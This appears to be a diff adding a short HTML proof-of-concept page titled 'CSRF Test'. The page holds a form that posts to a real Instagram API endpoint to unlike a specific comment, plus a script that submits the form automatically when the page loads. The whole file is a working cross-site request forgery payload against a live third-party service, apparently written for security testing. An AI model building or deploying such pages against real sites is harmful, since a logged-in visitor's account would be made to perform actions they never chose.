@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>CSRF Test</h2>
+
+<form action="https://www.instagram.com/api/v1/web/comments/unlike/18062636915022715/" method="POST">
+  <input type="submit" value="Send CSRF Test">
+</form>
+
+<!-- Optional: auto-submit on load -->
+<script>
+document.forms[0].submit();
+</script>
+
+</body>
+</html>
